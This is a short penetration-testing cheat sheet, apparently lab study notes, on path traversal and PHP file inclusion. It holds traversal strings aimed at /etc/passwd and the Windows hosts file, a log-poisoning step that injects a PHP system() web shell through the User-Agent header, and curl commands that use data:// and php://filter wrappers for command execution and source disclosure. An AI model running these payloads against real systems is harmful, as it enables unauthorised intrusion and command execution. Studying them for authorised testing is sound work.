### Path Traversal
#### Fuzzing

```
#Forward Slashes
../../../

#Backward Slashes
\..\..\..\

#URL Encoding
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/
```


```
#Linux File
/etc/passwd

#Windows File
C:\Windows\System32\drivers\etc\hosts
```

### File Inclusion
#### Log Poisoning

```
#Visit the log and observe what information is logged from where. Can you inject into it?
#Example Windows Host Running Apache / PHP Stack.
1. User-Agent: <?php echo system($_GET['cmd']); ?>
2. http://192.168.187.193/meteor/index.php?page=../../../../../../../../../xampp/apache/logs/access.log&cmd=dir
```
#### PHP Wrappers
##### Data

```
#allow_url_include must be set. This can be checked in the phpinfo.php file.
#This can execute commands directly.
1. curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<%3fphp%2520echo%2520system('uname+-a')%3b%3f>"
```
##### Filter

```
#Can use this to view contents of php files that are normally executed instead.
1. curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/backup.php"
```

#### File Upload

```
#Sometimes it is possible to overwrite files with our own.
#Example fileupload overwriting SSH key to our own.
```
![[Pasted image 20231101191427.png]]